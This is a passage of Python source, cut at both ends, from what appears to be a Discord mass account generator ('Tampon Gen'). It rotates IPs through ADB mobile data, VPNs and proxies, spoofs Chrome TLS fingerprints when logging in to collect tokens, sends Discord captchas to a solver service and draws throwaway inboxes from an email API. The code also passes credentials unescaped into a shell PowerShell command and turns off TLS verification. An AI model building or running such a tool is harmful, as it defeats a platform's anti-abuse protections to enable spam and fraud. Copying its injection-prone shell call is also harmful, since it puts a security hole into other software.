        return False
    
    log.info(f"ADB: New IP: {ip_after}")
    
    if ip_after != ip_before:
        log.success(f"ADB: IP rotation successful: {ip_before} -> {ip_after}")
        return True
    else:
        log.warning(f"ADB: IP unchanged after rotation")
        return False

def adb_check_connection(device: str = None) -> bool:
    """Check if ADB device is connected and responsive"""
    try:
        device = device or ADB_DEVICE
        if not device:
            return False
        result = adb_shell_command("getprop ro.build.version.release", device)
        return result is not None
    except Exception:
        return False

def init_adb() -> bool:
    """Initialize ADB support"""
    global ADB_ENABLED, ADB_DEVICE, ADB_HOST, ADB_PORT
    
    if not check_adb_installed():
        log.debug("ADB not installed or not in PATH")
        return False

    adb_config = config.get('adb', {})
    host = adb_config.get('host')
    port = adb_config.get('port')
    if host and port:
        ADB_HOST = host
        ADB_PORT = port
        output = adb_connect_remote(host, port)
        if output is None:
            log.warning("ADB remote connect returned no response")
            return False
        log.info(f"ADB remote connect output: {output}")

    device = get_adb_device()
    if not device and ADB_HOST and ADB_PORT:
        # If remote ADB is configured but no device present, try explicit remote device
        device = f"{ADB_HOST}:{ADB_PORT}"

    if not device:
        log.debug("No ADB device connected")
        return False
    
    if not adb_check_connection(device):
        log.warning("ADB device not responding")
        return False
    
    ADB_DEVICE = device
    ADB_ENABLED = True
    log.success(f"ADB initialized with device: {device}")
    return True

# ============================================================================
# PROXY HANDLER
# ============================================================================

def parse_proxy(proxy_string: str) -> Optional[Dict]:
    if not proxy_string:
        return None
    proxy_string = proxy_string.strip()
    if '://' not in proxy_string:
        proxy_string = 'socks5://' + proxy_string
    try:
        from urllib.parse import urlparse
        parsed = urlparse(proxy_string)
        proxy_type = parsed.scheme.lower()
        host = parsed.hostname
        port = parsed.port
        username = parsed.username
        password = parsed.password
        if not host or not port:
            return None
        # Build proxy URL without credentials for browser args
        if username and password:
            proxy_url_no_creds = f"{proxy_type}://{host}:{port}"
        else:
            proxy_url_no_creds = proxy_string
        full_url = proxy_string
        masked_url = proxy_string
        if username and password:
            masked_url = f"{proxy_type}://{username}:***@{host}:{port}"
        return {
            'type': proxy_type,
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'full_url': full_url,
            'proxy_url_no_creds': proxy_url_no_creds,
            'masked_url': masked_url,
        }
    except Exception:
        return None

def get_browser_proxy_args(proxy_config: Dict) -> list:
    args = []
    if not proxy_config:
        return args
    # Use proxy URL without credentials - they'll be handled via CDP auth
    proxy_url = proxy_config.get('proxy_url_no_creds') or proxy_config.get('full_url')
    if proxy_url:
        args.append(f'--proxy-server={proxy_url}')
        args.append('--proxy-bypass-list=<-loopback>')
    return args

def get_session_proxy(proxy_config: Dict) -> Optional[Dict]:
    if not proxy_config:
        return None
    full_url = proxy_config.get('full_url')
    if full_url:
        return {'http': full_url, 'https': full_url}
    return None

def load_proxies(config: dict) -> list:
    proxy_config = config.get("proxy", {})
    if not proxy_config.get("enabled", False):
        return []
    proxy_file = proxy_config.get("file", "input/proxies.txt")
    proxy_path = Path(proxy_file)
    if not proxy_path.exists():
        log.warning(f"Proxy file not found: {proxy_file}")
        return []
    try:
        proxies = []
        with open(proxy_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parsed = parse_proxy(line)
                    if parsed:
                        proxies.append(parsed)
        if proxies:
            log.success(f"Loaded {len(proxies)} proxies")
            return proxies
    except Exception as e:
        log.error(f"Error loading proxies: {e}")
    return []

async def setup_proxy_auth(browser, proxy_config: Dict):
    """Monitor and auto-fill proxy authentication dialog when it appears, retry only if still present"""
    if not proxy_config or not proxy_config.get('username') or not proxy_config.get('password'):
        return
    
    username = proxy_config.get('username', '')
    password = proxy_config.get('password', '')
    
    try:
        import pyautogui
        import subprocess
        
        async def auto_fill_proxy_auth():
            """Wait for proxy auth dialog and auto-fill credentials, retry only if dialog persists"""
            max_wait = 60  # Wait up to 60 seconds for dialog to appear
            max_retries = 10  # Retry up to 10 times if dialog still present
            dialog_found = False
            
            for wait_attempt in range(max_wait * 2):  # Check every 0.5 seconds
                try:
                    await asyncio.sleep(0.5)
                    
                    # Try to check if browser is responsive (indicates no auth dialog)
                    try:
                        page = await browser.get_page()
                        if page:
                            result = await asyncio.wait_for(page.evaluate("1"), timeout=1)
                            # Page is responsive - dialog is gone
                            if dialog_found:
                                log.success("Proxy authenticated successfully")
                            return
                    except Exception:
                        # Dialog detected - browser is blocked
                        if not dialog_found:
                            log.info("Proxy auth dialog detected, submitting credentials...")
                            dialog_found = True
                        
                        # Try to submit credentials with retries
                        retry_count = 0
                        while retry_count < max_retries:
                            try:
                                log.info(f"Submitting proxy auth (attempt {retry_count + 1}/{max_retries})...")
                                
                                # Clear any previous input - press Escape first
                                pyautogui.press('escape')
                                await asyncio.sleep(0.1)
                                
                                # Tab to first field (username)
                                pyautogui.press('tab')
                                await asyncio.sleep(0.15)
                                
                                # Clear field
                                pyautogui.hotkey('ctrl', 'a')
                                await asyncio.sleep(0.1)
                                
                                # Copy username to clipboard and paste
                                cmd = f'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::SetText(\'{username}\')"'
                                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                                await asyncio.sleep(0.1)
                                pyautogui.hotkey('ctrl', 'v')
                                await asyncio.sleep(0.3)
                                
                                # Tab to password field
                                pyautogui.press('tab')
                                await asyncio.sleep(0.15)
                                
                                # Clear field
                                pyautogui.hotkey('ctrl', 'a')
                                await asyncio.sleep(0.1)
                                
                                # Copy password to clipboard and paste
                                cmd = f'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::SetText(\'{password}\')"'
                                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                                await asyncio.sleep(0.1)
                                pyautogui.hotkey('ctrl', 'v')
                                await asyncio.sleep(0.3)
                                
                                # Press Enter to submit
                                pyautogui.press('enter')
                                await asyncio.sleep(2)
                                
                                # Check if dialog is gone after submission
                                try:
                                    page = await browser.get_page()
                                    if page:
                                        result = await asyncio.wait_for(page.evaluate("1"), timeout=1)
                                        log.success("Proxy authenticated successfully")
                                        return
                                except Exception:
                                    # Dialog still present, will retry
                                    retry_count += 1
                                    if retry_count < max_retries:
                                        log.debug(f"Auth dialog still present, retrying...")
                                        await asyncio.sleep(0.5)
                                    
                            except Exception as e:
                                log.debug(f"Auth submission error: {e}")
                                retry_count += 1
                                await asyncio.sleep(0.5)
                        
                        # If we exhausted retries and dialog still there
                        if retry_count >= max_retries:
                            log.warning(f"Could not submit proxy auth after {max_retries} attempts")
                            return
                        
                except Exception as e:
                    log.debug(f"Auth monitor error: {e}")
                    await asyncio.sleep(0.5)
        
        # Run in background
        asyncio.create_task(auto_fill_proxy_auth())
        
    except Exception as e:
        log.debug(f"Proxy auth setup: {e}")

# Global proxy list and lock for thread-safe proxy rotation
PROXY_LIST = []
PROXY_LIST_LOCK = threading.Lock()

def get_random_proxy() -> Optional[Dict]:
    """Get a random proxy from the proxy list (thread-safe)"""
    with PROXY_LIST_LOCK:
        if not PROXY_LIST:
            return None
        return random.choice(PROXY_LIST)

# ============================================================================
# DISCORD TOKEN FETCH
# ============================================================================

async def fetch_discord_token(email: str, password: str, proxy_config: Dict = None) -> str:
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    payload = {"login": email, "password": password}
    session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
    if proxy_config:
        proxy_dict = get_session_proxy(proxy_config)
        if proxy_dict:
            session.proxies = proxy_dict
    try:
        response = session.post(url, headers=headers, json=payload)
        if response.status_code != 200:
            return ""
        return response.json().get("token", "")
    except:
        return ""

# ============================================================================
# JAVASCRIPT UTILITIES
# ============================================================================

# ============================================================================
# EXTERNAL SOLVER INTEGRATION
# ============================================================================

SOLVER_URL = "http://127.0.0.1:5003"
SOLVER_TIMEOUT = 120

def send_captcha_to_solver(task_id: str, page_url: str = "https://discord.com/register", captcha_type: str = "unknown") -> Optional[str]:
    """Send captcha task to external solver and wait for result"""
    try:
        payload = {
            'task_id': task_id,
            'type': captcha_type,
            'page_url': page_url
        }
        
        response = requests.post(f'{SOLVER_URL}/api/solve', json=payload, timeout=5)
        if response.status_code not in [200, 202]:
            log.warning(f"Solver queue failed: {response.status_code}")
            return None
        
        log.info(f"Captcha task {task_id} sent to solver")
        
        # Poll for result
        start_time = time.time()
        poll_interval = 2
        while time.time() - start_time < SOLVER_TIMEOUT:
            try:
                result_response = requests.get(f'{SOLVER_URL}/api/result/{task_id}', timeout=5)
                
                if result_response.status_code == 200:
                    data = result_response.json()
                    if data.get('status') == 'completed':
                        token = data.get('token')
                        log.orange_gradient(f"Captcha solved: {task_id}")
                        return token
            except:
                pass
            
            time.sleep(poll_interval)
        
        log.warning(f"Solver timeout for {task_id}")
        return None
    
    except Exception as e:
        log.error(f"Solver integration error: {e}")
        return None

def check_solver_health() -> bool:
    """Check if solver is running"""
    try:
        response = requests.get(f'{SOLVER_URL}/api/status', timeout=5)
        return response.status_code == 200
    except:
        return False

JS_UTILS = '''
(() => {
    if (window.utils) return;
    
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) {
            el.value = value;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
        }
    }
    
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        let clicked = 0;
        checkboxes.forEach(cb => {
            if (!cb.checked) {
                cb.click();
                cb.checked = true;
                clicked++;
            }
        });
        return { clicked: clicked, total: checkboxes.length };
    }
    
    function clickElement(selector) {
        const el = document.querySelector(selector);
        if (el) el.click();
    }
    
    window.utils = {
        setInput,
        clickAllCheckboxes,
        clickElement,
    };
})();
'''

# ============================================================================
# CONFIGURATION
# ============================================================================

LOCK = threading.Lock()
SESSION_TARGET = 0
SESSION_CREATED = 0
SESSION_STOP = False
ACTIVE_WORKERS = 0
WORKER_LOCK = threading.Lock()
START_TIME = time.time()
COOLDOWN_SECONDS = 60

CONFIG_DIR = Path('input')
CONFIG_PATH = CONFIG_DIR / 'config.json'
OUTPUT_DIR = Path('output')
OUTPUT_DIR.mkdir(exist_ok=True)

def load_or_create_config():
    if not CONFIG_PATH.exists():
        CONFIG_DIR.mkdir(exist_ok=True)
        template_config = {
            "threads": 1,
            "cooldown": 91,
            "email_provider": {"name": "", "api_key": "", "client_key": "", "domain": "leveragers.xyz"},
            "proxy": {"enabled": False, "file": "input/proxies.txt"},
            "mullvad": {
                "enabled": False,
                "country": "us",
                "auto_login": False,
                "account_number": "",
                "account_file": "input/mullvad_accounts.txt"
            },
            "urbanvpn": {"enabled": False, "server": "us", "path": ""},
            "adb": {"enabled": False, "path": "", "host": "127.0.0.1", "port": 5555}
        }
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(template_config, f, indent=4)
        print(f"\n\033[93m[CONFIG]\033[0m Config created at: {CONFIG_PATH}")
        sys.exit(0)
    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)

config = load_or_create_config()
THREAD_COUNT = config.get("threads", 1)
COOLDOWN_SECONDS = config.get("cooldown", 10)

mullvad_config = config.get("mullvad", {})
urbanvpn_config = config.get("urbanvpn", {})
if mullvad_config.get("enabled", False) and urbanvpn_config.get("enabled", False):
    print("\033[91m[ERROR]\033[0m Cannot enable both Mullvad and UrbanVPN at the same time.")
    sys.exit(1)

if mullvad_config.get("enabled", False):
    if check_mullvad_installed():
        MULLVAD_AVAILABLE = True
        THREAD_COUNT = 1
        print(f"\033[92m[INFO]\033[0m Mullvad VPN enabled (country: {mullvad_config.get('country', 'us')})")
    else:
        print("\033[91m[ERROR]\033[0m Mullvad CLI not found! Install Mullvad VPN or disable it in config.")
        sys.exit(1)


adb_config = config.get("adb", {})
if adb_config.get("enabled", False):
    # ADB initialization will be done after logger is created
    pass

# ============================================================================
# LOGGER
# ============================================================================

if sys.platform == 'win32':
    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

GRAY = '\033[90m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RED = '\033[91m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
RESET = '\033[0m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
MAGENTA = '\033[95m'
ORANGE = '\033[38;5;208m'
SOFT = '\033[38;2;180;180;220m'

class Logger:
    def __init__(self):
        self._lock = threading.Lock()
        self._buffer = deque(maxlen=1000)

    def _rich_emit(self, tag: str, message: str):
        """Emit a modern rich-formatted single-line log to ConsoleUI if available."""
        # Disabled - using title-only mode
        return

    def _print_inline(self, emoji: str, tag: str, tag_color: str, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            icons = {'DEBUG':'D','WARNING':'!','ERROR':'✖','SUCCESS':'✓','INFO':'i','SOFT':'·'}
            icon = icons.get(tag.strip(), '')
            gradient_message = self._gradientize(message)
            line = f"{GRAY}[{ts}]{RESET} {tag_color}{icon} {tag:<8}{RESET} {GRAY}│{RESET} {gradient_message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, tag.strip(), message))
            except Exception:
                pass
            try:
                self._rich_emit(tag.strip(), message)
            except Exception:
                pass

    def _gradientize(self, message: str) -> str:
        if not message:
            return message
        stops = [
            (148, 0, 211),
            (75, 0, 130),
            (0, 128, 255),
            (0, 255, 200),
            (255, 255, 255)
        ]
        n = len(message)
        gradient_text = ""
        for i, ch in enumerate(message):
            if ch == '\n':
                gradient_text += ch
                continue
            t = i / (n - 1) if n > 1 else 0
            pos = t * (len(stops) - 1)
            idx = int(pos)
            frac = pos - idx
            r1, g1, b1 = stops[idx]
            r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
            r = int(r1 + (r2 - r1) * frac)
            g = int(g1 + (g2 - g1) * frac)
            b = int(b1 + (b2 - b1) * frac)
            gradient_text += f"\033[38;2;{r};{g};{b}m{ch}"
        return gradient_text

    def _rich_gradient_text(self, message: str) -> Text:
        text = Text()
        if not message:
            return text
        stops = [
            (148, 0, 211),
            (75, 0, 130),
            (0, 128, 255),
            (0, 255, 200),
            (255, 255, 255)
        ]
        n = len(message)
        for i, ch in enumerate(message):
            if ch == '\n':
                text.append(ch)
                continue
            t = i / (n - 1) if n > 1 else 0
            pos = t * (len(stops) - 1)
            idx = int(pos)
            frac = pos - idx
            r1, g1, b1 = stops[idx]
            r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
            r = int(r1 + (r2 - r1) * frac)
            g = int(g1 + (g2 - g1) * frac)
            b = int(b1 + (b2 - b1) * frac)
            text.append(ch, style=f"rgb({r},{g},{b})")
        return text

    def mask_email(self, email: str) -> str:
        if '@' not in email:
            return email
        username, domain = email.split('@', 1)
        masked = (username[:4] if len(username) > 4 else username[0]) + '****'
        return f"{masked}@{domain}"

    def mask_token(self, token: str) -> str:
        return token[:20] + '***' if len(token) > 20 else token

    def mask_ip(self, ip: str) -> str:
        if not ip:
            return ip
        if ':' in ip:
            parts = ip.split(':')
            if len(parts) >= 3:
                masked_middle = ':'.join('****' for _ in parts[1:-1])
                return f"{parts[0]}:{masked_middle}:{parts[-1]}"
            return ':'.join(parts[:1] + ['****'])
        if '.' in ip:
            parts = ip.split('.')
            if len(parts) == 4:
                return f"{parts[0]}.***.***.{parts[3]}"
            if len(parts) == 2:
                return f"{parts[0]}.***"
        return re.sub(r'[0-9]', '*', ip)

    def mask_fingerprint(self, fingerprint: str) -> str:
        if not fingerprint or len(fingerprint) <= 8:
            return '***'
        return fingerprint[:4] + '***' + fingerprint[-4:]

    def hunt(self, message: str):
        self.gradient(message, "HUNT")

    def solved(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{GRAY}[{ts}]{RESET} {MAGENTA}SOL{RESET} {GRAY}>{RESET} {gradient_message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'SOLVED', message))
            except Exception:
                pass
            try:
                self._rich_emit('SOLVED', message)
            except Exception:
                pass

    def warning(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{GRAY}[{ts}]{RESET} {YELLOW}WAR{RESET} {GRAY}>{RESET} {gradient_message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'WARNING', message))
            except Exception:
                pass
            try:
                self._rich_emit('WARNING', message)
            except Exception:
                pass

    def error(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            line = f"{GRAY}[{ts}]{RESET} {RED}ERR{RESET} {GRAY}>{RESET} {RED}{message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'ERROR', message))
            except Exception:
                pass
            try:
                self._rich_emit('ERROR', message)
            except Exception:
                pass

    def info(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{GRAY}[{ts}]{RESET} {CYAN}INF{RESET} {GRAY}>{RESET} {gradient_message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'INFO', message))
            except Exception:
                pass
            try:
                self._rich_emit('INFO', message)
            except Exception:
                pass

    def success(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{GRAY}[{ts}]{RESET} {GREEN}SUC{RESET} {GRAY}>{RESET} {gradient_message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'SUCCESS', message))
            except Exception:
                pass
            try:
                self._rich_emit('SUCCESS', message)
            except Exception:
                pass

    def header(self, tg: str = '', threads: int = 1, ip: str = ''):
        """Print a compact header line with telegram/contact, threads and IP."""
        with self._lock:
            left = f"tg : {tg}"
            mid = f"Threads : {threads}"
            right = f"IP : {ip}"
            # compute spacing
            line = f"{PURPLE}{left}{RESET}  |  {WHITE}{right}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

    def debug(self, message: str):
        return

    # Debug logs disabled for cleaner output

    def batch(self, message: str):
        return  # Disabled batch logs

    def soft(self, message: str):
        """Print message with a soft pastel color"""
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            line = f"{GRAY}[{ts}]{RESET} {SOFT}{'SOFT':<10}{RESET} {GRAY}│{RESET} {SOFT}{message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'SOFT', message))
            except Exception:
                pass
            try:
                self._rich_emit('SOFT', message)
            except Exception:
                pass

    def gradient(self, message: str, tag: str = "GRADIENT"):
        """Print message with purple-white gradient effect"""
        if tag == "DEBUG":
            return
        if tag == "INFO":
            return self.info(message)
        if tag == "WARNING":
            return self.warning(message)
        if tag == "SUCCESS":
            return self.success(message)
        if tag == "SOLVED":
            return self.solved(message)
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            # Smooth truecolor gradient across the message using several color stops
            if not message:
                line = f"{GRAY}[{ts}]{RESET} {PURPLE}{tag:<10}{RESET} {GRAY}│{RESET} {WHITE}{message}{RESET}\n"
                sys.stdout.write(line)
                sys.stdout.flush()
                return

            # RGB color stops (purple -> indigo -> cyan -> mint -> white)
            stops = [
                (148, 0, 211),  # purple
                (75, 0, 130),   # indigo
                (0, 128, 255),  # cyan-blue
                (0, 255, 200),  # mint
                (255, 255, 255) # white
            ]

            n = len(message)
            gradient_text = ""
            for i, ch in enumerate(message):
                if ch == '\n':
                    gradient_text += ch
                    continue
                t = i / (n - 1) if n > 1 else 0
                # position between stops
                pos = t * (len(stops) - 1)
                idx = int(pos)
                frac = pos - idx
                r1, g1, b1 = stops[idx]
                r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
                r = int(r1 + (r2 - r1) * frac)
                g = int(g1 + (g2 - g1) * frac)
                b = int(b1 + (b2 - b1) * frac)
                gradient_text += f"\033[38;2;{r};{g};{b}m{ch}"

            line = f"{GRAY}[{ts}]{RESET} {PURPLE}{tag:<10}{RESET} {GRAY}│{RESET} {gradient_text}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

    def gradient_success(self, message: str):
        """Print success message with gradient effect"""
        # Use plain success styling (purple tag + white message)
        self.success(message)

    def gradient_warning(self, message: str):
        """Print warning message with gradient effect"""
        self.warning(message)

    def gradient_info(self, message: str):
        """Print info message with gradient effect"""
        self.info(message)

    def orange_gradient(self, message: str):
        """Print message with orange gradient effect"""
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            # Orange gradient stops (dark orange -> orange -> light orange -> gold)
            stops = [
                (255, 100, 0),   # dark orange
                (255, 140, 0),   # orange
                (255, 165, 0),   # light orange
                (255, 200, 0)    # gold
            ]

            n = len(message)
            gradient_text = ""
            for i, ch in enumerate(message):
                if ch == '\n':
                    gradient_text += ch
                    continue
                t = i / (n - 1) if n > 1 else 0
                pos = t * (len(stops) - 1)
                idx = int(pos)
                frac = pos - idx
                r1, g1, b1 = stops[idx]
                r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
                r = int(r1 + (r2 - r1) * frac)
                g = int(g1 + (g2 - g1) * frac)
                b = int(b1 + (b2 - b1) * frac)
                gradient_text += f"\033[38;2;{r};{g};{b}m{ch}"

            line = f"{GRAY}[{ts}]{RESET} {gradient_text}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'CAPTCHA', message))
            except Exception:
                pass

    def white(self, message: str):
        """Print message in fully white color"""
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            line = f"{GRAY}[{ts}]{RESET} {WHITE}{message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'INFO', message))
            except Exception:
                pass

    def purple_white_gradient(self, message: str):
        """Print message with purple to white gradient effect"""
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            # Purple to white gradient stops
            stops = [
                (148, 0, 211),   # purple
                (175, 0, 255),   # blue purple
                (200, 100, 255), # light purple
                (255, 255, 255)  # white
            ]

            n = len(message)
            gradient_text = ""
            for i, ch in enumerate(message):
                if ch == '\n':
                    gradient_text += ch
                    continue
                t = i / (n - 1) if n > 1 else 0
                pos = t * (len(stops) - 1)
                idx = int(pos)
                frac = pos - idx
                r1, g1, b1 = stops[idx]
                r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
                r = int(r1 + (r2 - r1) * frac)
                g = int(g1 + (g2 - g1) * frac)
                b = int(b1 + (b2 - b1) * frac)
                gradient_text += f"\033[38;2;{r};{g};{b}m{ch}"

            line = f"{GRAY}[{ts}]{RESET} {gradient_text}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'GENNED', message))
            except Exception:
                pass

    def token_status(self, status: str):
        color_map = {'VALID': GREEN, 'LOCKED': YELLOW, 'INVALID': RED}
        color = color_map.get(status, WHITE)
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            line = f"{GRAY}[{ts}]{RESET} {color}TOK{RESET} {GRAY}>{RESET} {color}[{status}]{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

log = Logger()


class ConsoleUI:
    def __init__(self, logger: Logger, refresh: float = 0.5, line_mode: bool = True):
        self.logger = logger
        self.console = Console()
        self.refresh = refresh
        self._running = False
        self._thread = None
        self.line_mode = line_mode

    def _build_stats_table(self) -> Table:
        table = Table.grid(padding=(0,1))
        table.add_column(justify="left")
        table.add_column(justify="right")
        try:
            ms = get_mullvad_stats()
            table.add_row("Mullvad Rotations", str(ms.get('total_rotations', 0)))
            table.add_row("IP Changes", str(ms.get('ip_changes', 0)))
            table.add_row("Last IP", str(ms.get('last_ip', 'n/a')))
        except Exception:
            pass
        try:
            ac = get_account_stats()
            table.add_row("Valid", str(ac.get('valid', 0)))
            table.add_row("Invalid", str(ac.get('invalid', 0)))
            table.add_row("Locked", str(ac.get('locked', 0)))
        except Exception:
            pass
        return table

    def _build_logs_panel(self) -> Panel:
        t = Text()
        color_map = {
            'DEBUG': 'white',
            'WARNING': 'yellow',
            'SUCCESS': 'magenta',
            'INFO': 'red',
            'SOLVED': 'white',
            'SOFT': 'rgb(180,180,220)'
        }
        icons = {'DEBUG':'D', 'WARNING':'!', 'ERROR':'✖', 'SUCCESS':'✓', 'INFO':'i', 'SOLVED':'□', 'SOFT':'·'}
        # single-line mode: render each buffer item as one line without extra panels
        for item in list(self.logger._buffer)[-500:]:
            try:
                ts, tag, msg = item
            except Exception:
                # backward compatibility
                try:
                    tag, msg = item
                    ts = ''
                except Exception:
                    continue
            style = color_map.get(tag, 'white')
            icon = icons.get(tag, '')
            try:
                clean = re.sub(r'\x1b\[[0-9;]*m', '', msg)
            except Exception:
                clean = msg
            clean = clean.replace('\n', ' ')
            line = Text()
            line.append(f"[{ts}] ", style="dim")
            line.append(f"{icon} {tag}", style=style)
            line.append(" │ ", style="dim")
            line.append(clean, style="white")
            t.append(line)
            t.append('\n')
        return Panel(t, title="Logs", border_style="white")

    def _build_ascii_panel(self) -> Panel:
        # Removed legacy ASCII art; keep a simple placeholder panel instead.
        return Panel(Text(""), title="App", border_style="magenta")

    def _render(self):
        layout = Layout()
        if self.line_mode:
            # compact single-column layout showing only logs
            layout.split_column(
                Layout(name="header", size=1),
                Layout(name="logs", ratio=1),
                Layout(name="footer", size=1)
            )
            layout["header"].update(Panel(Text("Modern Logs", justify="left", style="bold white"), style="blue"))
            layout["logs"].update(self._build_logs_panel())
            layout["footer"].update(Panel(Text("Ctrl+C to exit | logs only mode", justify="center"), style="dim"))
            return layout

        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="body", ratio=1),
            Layout(name="footer", size=1)
        )
        layout["body"].split_row(
            Layout(name="left", size=30),
            Layout(name="center", size=40),
            Layout(name="right", ratio=1)
        )

        layout["header"].update(Panel(Text("Modern Console UI", justify="center", style="bold white"), style="blue"))
        layout["left"].update(Panel(self._build_stats_table(), title="Stats", border_style="green"))
        layout["center"].update(self._build_ascii_panel())
        layout["right"].update(self._build_logs_panel())
        layout["footer"].update(Panel(Text("Press Ctrl+C to exit", justify="center"), style="dim"))
        return layout

    def _update_title(self):
        try:
            ac = get_account_stats()
            ns = get_network_stats()
            created = globals().get('SESSION_CREATED', 0)
            start_time = globals().get('START_TIME', time.time())
            elapsed = max(time.time() - start_time, 1)
            total = created if created > 0 else 1
            valid_pct = (ac.get('valid', 0) / total * 100) if total > 0 else 0
            
            # Minimal format: Tampon Gen | Gens X (Y%) | Valid X | Invalid X | Locked X | Cap X | Up X.XX Mbps | Down X.XX Mbps
            locked_str = str(ac.get('locked', 0)) if ac.get('locked', 0) > 0 else '-'
            title = (
                f"Tampon Gen | "
                f"Gens {created} ({valid_pct:.0f}%) | "
                f"Valid {ac.get('valid', 0)} | "
                f"Invalid {ac.get('invalid', 0)} | "
                f"Locked {locked_str} | "
                f"Cap {ac.get('captcha_ok', 0)} | "
                f"Up {ns['upload_mbps']:.2f} Mbps | "
                f"Down {ns['download_mbps']:.2f} Mbps"
            )
            if sys.platform == 'win32':
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetConsoleTitleW(title)
                except Exception:
                    os.system(f"title {title}")
            else:
                sys.stdout.write(f"\x1b]2;{title}\x07")
        except Exception:
            pass

    def _run(self):
        self._running = True
        while self._running:
            try:
                self._update_title()
                time.sleep(self.refresh)
            except Exception:
                time.sleep(self.refresh)

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

# ConsoleUI disabled by default — keep stdout-only compact logs
console_ui = None

# Initialize ADB if enabled
adb_config = config.get("adb", {})
if adb_config.get("enabled", False):
    try:
        # Quick check for adb binary before attempting full init
        if not check_adb_installed():
            log.warning("ADB not found on PATH; disabling ADB IP rotation")
            ADB_ENABLED = False
        else:
            # Run init_adb in background with timeout to avoid blocking main thread
            result = {'ok': None, 'err': None}
            def _init_wrapper():
                try:
                    result['ok'] = init_adb()
                except Exception as e:
                    result['ok'] = False
                    result['err'] = e

            t = threading.Thread(target=_init_wrapper, daemon=True)
            t.start()
            t.join(20)
            if t.is_alive():
                log.warning("ADB init timed out; disabling ADB IP rotation")
                ADB_ENABLED = False
            else:
                if result.get('ok'):
                    log.success("ADB IP rotation enabled")
                else:
                    err = result.get('err')
                    if err:
                        log.warning(f"ADB init error: {err}")
                    else:
                        log.warning("ADB not available - continuing without ADB IP rotation")
    except Exception as e:
        # Ensure failures here don't stop the program
        ADB_ENABLED = False
        log.warning(f"ADB init error, disabling ADB: {e}")

# ============================================================================
# HOTMAIL007 EMAIL API
# ============================================================================

class Hotmail007API:
    """Hotmail007 API"""
    
    def __init__(self, client_key: str):
        self.session = requests.Session()
        self.session.verify = False
        self.client_key = client_key
        self.base_url = "https://gapi.hotmail007.com"
        # Prefer premium Graph API account types first, fallback to legacy types
        # Include several common variants/aliases used by providers
        self.mail_types = [
            "HOTMAIL_TRUSTED_GRAPH_API",
            "HOTMAIL_TRUSTED_GRAPH",
            "hotmail Trusted Graph",
            "hotmail_trusted_graph",
            "hotmail",
        ]
    
    def check_balance(self) -> float:
        """Check account balance"""
        url = f"{self.base_url}/api/user/balance"
        params = {"clientKey": self.client_key}
        try:
